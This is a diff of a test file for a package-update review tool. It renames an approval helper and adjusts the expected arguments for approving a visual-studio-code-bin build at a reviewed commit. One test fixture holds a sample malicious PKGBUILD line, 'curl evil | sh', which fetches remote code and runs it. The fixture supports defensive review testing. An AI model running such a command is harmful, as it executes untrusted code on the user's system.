@@ -46,7 +46,7 @@ ShellRoot {
     var text = "commit " + sha + "\ndiff --git a/PKGBUILD b/PKGBUILD\n+curl evil | sh\n"
     check(Model.reviewCommit(text) === sha && Model.reviewCommit("no commit\n") === "", "the commit the review read")
     check(Model.reviewBody(text).indexOf("diff --git") === 0, "and the change without it")
-    check(JSON.stringify(Model.approveCommand("visual-studio-code-bin", sha)) === JSON.stringify(["nova-update-run", "--apps-only", "--only", "visual-studio-code-bin", "--approve", "visual-studio-code-bin=" + sha]), "built at that commit alone")
+    check(JSON.stringify(Model.approveArgs("visual-studio-code-bin", sha)) === JSON.stringify(["--apps-only", "--only", "visual-studio-code-bin", "--approve", "visual-studio-code-bin=" + sha]), "built at that commit alone, nova-update-run named once (by UpdateRun)")
     check(Model.tail("a\nb\nc\n", 2) === "b\nc", "the end of the log")
 
     console.log("DONE")
